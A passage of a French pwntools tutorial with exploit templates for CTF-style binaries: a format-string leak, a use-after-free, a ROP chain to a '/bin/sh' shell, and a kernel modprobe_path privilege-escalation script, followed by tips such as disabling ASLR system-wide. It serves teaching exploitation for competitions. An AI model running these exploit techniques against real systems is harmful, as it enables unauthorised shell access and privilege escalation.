payload = b"%p.%p.%p.%p.%p"
p.sendline(payload)
output = p.recvline()

print(output)

p.close()
```

### Exemple 3 : Use-After-Free

**Concept** : Utiliser la mémoire après qu'elle soit libérée.

```python
from pwn import *

p = process("./vuln")

# 1. Allouer
p.sendline(b"alloc 100")
p.recvline()

# 2. Libérer
p.sendline(b"free")
p.recvline()

# 3. Réallouer (slab reclamation)
p.sendline(b"alloc 100")
p.recvline()

# 4. Écrire des données contrôlées
p.sendline(b"write " + p64(0x12345678))
p.recvline()

# 5. Utiliser la mémoire réallouée
p.sendline(b"use")
output = p.recvline()

# La mémoire qu'on a réallouée est maintenant utilisée
# dans un contexte sensible

p.close()
```

### Exemple 4 : ROP Chain Complet

```python
from pwn import *

context.arch = 'amd64'
context.os = 'linux'
context.log_level = 'info'

elf = ELF("./binary")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")

log.info("[*] Adresses:")
log.info(f"    main: {hex(elf.symbols['main'])}")
log.info(f"    system: {hex(libc.symbols['system'])}")

# Chercher /bin/sh
bin_sh = next(libc.search(b"/bin/sh"))
log.info(f"    /bin/sh: {hex(bin_sh)}")

# Créer ROP chain
rop = ROP(elf)
rop.call("system", [bin_sh])

# Créer payload
buffer_size = 64
padding_size = 8
payload = b'A' * buffer_size
payload += b'B' * padding_size
payload += rop.chain()

# Exploit
p = process("./binary")
p.sendline(payload)
p.interactive()
```

### Exemple 5 : Kernel Exploitation

```python
from pwn import *
import os
import subprocess

context.log_level = 'info'

# ===== XSSKernel-like exploitation =====

DEVICE = "/dev/xsskernel"
IOCTL_WRITE = 0x12345678  # Vous le trouverez dans le code

log.info("[*] XSSKernel Exploit")

# Étape 1 : Trigger UAF
log.info("[*] Triggering UAF...")
fd = os.open(DEVICE, os.O_RDWR)

# Étape 2 : Leak kernel addresses
log.info("[*] Leaking modprobe_path...")
with open("/proc/kallsyms") as f:
    for line in f:
        parts = line.split()
        if len(parts) >= 3 and parts[2] == "modprobe_path":
            modprobe_addr = int(parts[0], 16)
            log.success(f"[+] modprobe_path @ {hex(modprobe_addr)}")
            break

# Étape 3 : Corrupt modprobe_path
log.info("[*] Corrupting modprobe_path...")
new_path = b"/tmp/pwn"
# Utiliser ioctl pour écrire
# fcntl.ioctl(fd, IOCTL_WRITE, new_path)

# Étape 4 : Créer le script malveillant
log.info("[*] Creating /tmp/pwn...")
script = """#!/bin/sh
cp /flag /tmp/flag
chmod 777 /tmp/flag
"""
with open("/tmp/pwn", "w") as f:
    f.write(script)
os.chmod("/tmp/pwn", 0o755)

# Étape 5 : Trigger modprobe
log.info("[*] Triggering modprobe...")
subprocess.run(["touch", "/tmp/unknown_format"])
try:
    subprocess.run(["/tmp/unknown_format"], timeout=2)
except:
    pass

# Étape 6 : Read flag
log.info("[*] Reading flag...")
if os.path.exists("/tmp/flag"):
    with open("/tmp/flag") as f:
        flag = f.read()
    log.success(f"[+] Flag: {flag}")
else:
    log.failure("[-] Flag not found")

os.close(fd)
```

---

## Best Practices

### 1. Structure Modulaire

```python
#!/usr/bin/env python3

from pwn import *

# ===== CONFIGURATION =====
context.arch = 'amd64'
context.os = 'linux'
context.log_level = 'info'

TARGET_HOST = "localhost"
TARGET_PORT = 1234
BINARY = "./binary"

# ===== HELPER FUNCTIONS =====

def exploit_local():
    """Exploit sur le binaire local"""
    elf = ELF(BINARY)
    p = process(BINARY)
    return p, elf

def exploit_remote():
    """Exploit sur le serveur distant"""
    p = remote(TARGET_HOST, TARGET_PORT)
    return p

def build_payload(elf):
    """Construire le payload"""
    win_addr = elf.symbols['win']
    payload = cyclic(64)
    payload += p64(win_addr)
    return payload

# ===== MAIN =====

def main():
    log.info("[*] Starting exploit")
    
    # Choisir local ou remote
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        p = exploit_remote()
    else:
        p, elf = exploit_local()
    
    # Construire et envoyer
    payload = build_payload(elf)
    p.sendline(payload)
    
    # Interagir
    p.interactive()

if __name__ == "__main__":
    main()
```

### 2. Gestion des Erreurs

```python
from pwn import *

try:
    p = remote("localhost", 1234, timeout=5)
    log.success("Connected")
except socket.error:
    log.failure("Cannot connect to server")
    sys.exit(1)

try:
    response = p.recvline(timeout=5)
except socket.timeout:
    log.failure("Timeout while receiving")
    sys.exit(1)

p.close()
```

### 3. Debugging Progressif

```python
from pwn import *

context.log_level = 'debug'  # Activer la verbosité maximale

# Pour les problèmes, attacher GDB
p = gdb.debug("./binary", gdbscript="""
    break main
    continue
""")

# Ou utiliser print statements
log.debug("Avant d'envoyer le payload")
p.sendline(payload)
log.debug("Payload envoyé")

response = p.recvline()
log.debug(f"Réponse: {response}")
```

### 4. Tester Localement d'Abord

```python
from pwn import *

# Développer et tester localement
if os.path.exists("./binary"):
    p = process("./binary")
    log.info("Testing locally")
else:
    p = remote("target.com", 1234)
    log.info("Connecting to remote")

# Une fois que ça marche, switcher facilement
```

### 5. Documentar Votre Exploit

```python
#!/usr/bin/env python3
"""
Exploit for CVE-2024-XXXXX

Vulnerability: Buffer Overflow in vulnerable_function()
- Input: 32 bytes buffer
- Overflow: +8 bytes = Return Address

Usage:
    python3 exploit.py [local|remote]

Author: Your Name
Date: 2024
"""

from pwn import *

# ... code ici ...
```

---

## Troubleshooting

### Problème 1 : "Connection refused"

```python
from pwn import *

try:
    p = remote("localhost", 1234, timeout=5)
except ConnectionRefusedError:
    log.failure("Server not running!")
    log.info("Start server with: nc -lvnp 1234")
    sys.exit(1)
```

**Solution** : Assurez-vous que le serveur tourne `nc -lvnp 1234`

### Problème 2 : "Timeout"

```python
from pwn import *

# Augmenter le timeout
p = remote("localhost", 1234, timeout=30)

# Ou faire un debug
p.recvline(timeout=5)  # Timeout par command
```

**Cause** : Le serveur est lent ou il y a un bug dans votre exploit

### Problème 3 : ELF not found

```python
from pwn import *

try:
    elf = ELF("./binary")
except FileNotFoundError:
    log.failure("Binary not found!")
    log.info("Compile with: gcc -o binary binary.c")
    sys.exit(1)
```

**Solution** : Compiler le binaire d'abord

### Problème 4 : ASLR enabled

```python
from pwn import *

# Désactiver ASLR localement
p = process("./binary", aslr=False)

# Ou au niveau système
os.system("echo 0 | sudo tee /proc/sys/kernel/randomize_va_space")
```

### Problème 5 : Adresses incorrectes

```python
from pwn import *

elf = ELF("./binary")

# Vérifier que c'est un ELF valide
print(elf.checksec())

# Vérifier les symboles
if 'win' not in elf.symbols:
    log.failure("Symbol 'win' not found (binary is stripped?)")
    log.info("Use objdump: objdump -t binary | grep win")
```

### Problème 6 : GDB ne se lance pas

```python
# S'assurer que GDB est installé
os.system("which gdb")

# Ou utiliser strace pour debug
p = process("./binary")
os.system(f"strace -p {p.pid}")
```

### Checklist de Debugging

- [ ] Le binaire compile correctement?
- [ ] Le serveur tourne?
- [ ] Les adresses sont correctes? (ELF checksec, objdump)
- [ ] L'architecture correspond? (file binary)
- [ ] ASLR/PIE activés? (checksec)
- [ ] Les symboles existent? (nm binary, objdump)
- [ ] Le payload est-il de la bonne taille? (print(len(payload)))
- [ ] L'endianness est correct? (little vs big)

---

## Ressources Supplémentaires

### Documentation Officielle
- GitHub: https://github.com/Gallopsled/pwntools
- Docs: https://docs.pwntools.com/

### Tutoriels
- LiveOverflow YouTube: https://www.youtube.com/@LiveOverflow
- pwn.college: https://pwn.college/

### Outils Complémentaires
- radare2 : Reverse engineering
- Ghidra : Décompileur
- IDA Pro : Analyseur binaire
- GDB : Debugging
- ROPgadget : Trouver les gadgets

### Communautés
- r/HowToHack
- CTF Forum
- Exploit-DB

---

## Conclusion

Pwntools est un outil **essentiel** pour :
- ✅ L'exploitation de vulnérabilités
- ✅ Les compétitions CTF
- ✅ La sécurité offensive
- ✅ Le reverse engineering

**Commencez simple** :
1. Installez pwntools
2. Exploitez un challenge BOF
3. Progressez vers ROP, shellcode, etc

**La pratique est la clé** ! Plus vous l'utilisez, plus vous maîtriserez.

---

**Bonne chance dans vos exploitations! 🚀**
